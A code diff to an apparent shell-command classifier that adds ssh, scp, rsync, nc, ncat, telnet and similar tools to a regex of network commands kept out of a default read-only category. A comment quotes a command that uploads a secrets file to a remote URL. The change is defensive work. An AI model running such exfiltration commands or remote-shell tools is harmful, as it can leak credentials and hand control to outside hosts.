@@ -342,13 +342,21 @@ DB_CLIENTS = ("psql", "mysql", "sqlite3", "redis-cli", "mongosh", "mariadb",
 _DB_CLIENT_HEAD = re.compile(
     rf"(?i)^(?:{'|'.join(re.escape(name) for name in DB_CLIENTS)})\b")
 
-# Tools that fetch from or send to a remote host. Unlike a merely
-# unrecognised local command, these can exfiltrate - `curl --data-binary
-# @secrets.env <remote URL>` sends the file's contents, not just the fact
-# that curl ran - so they are excluded from the unknown-command fallback's
-# default read even when nothing else about the line looks like a mutation.
+# Tools that fetch from, send to, or run a command on a remote host. Unlike a
+# merely unrecognised local command, these can exfiltrate or execute
+# remotely - `curl --data-binary @secrets.env <remote URL>` sends the file's
+# contents, not just the fact that curl ran, and `ssh host cmd`/`scp file
+# host:` are a remote shell and a remote copy, not a local read of anything -
+# so they are excluded from the unknown-command fallback's default read even
+# when nothing else about the line looks like a mutation. `godmode_netgate.py`
+# was checked for a reusable network-egress category first (per the
+# controller's own instruction): it is a differential runtime socket-capture
+# tool with no command vocabulary or category of its own, so there is nothing
+# to reuse - these stay `unknown-command`, the same category the fetch tools
+# above already use.
 _NETWORK_FETCH_HEADS = re.compile(
-    r"(?i)^\s*(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)\b")
+    r"(?i)^\s*(?:curl|wget|Invoke-WebRequest|Invoke-RestMethod|iwr|irm|"
+    r"ssh|scp|rsync|sftp|ftp|nc|ncat|telnet)\b")
 
 # Programs this module already models as "has a real write surface, and the
 # safe/read forms of it are enumerated above" (`git`, via `_SAFE_PREFIXES`/
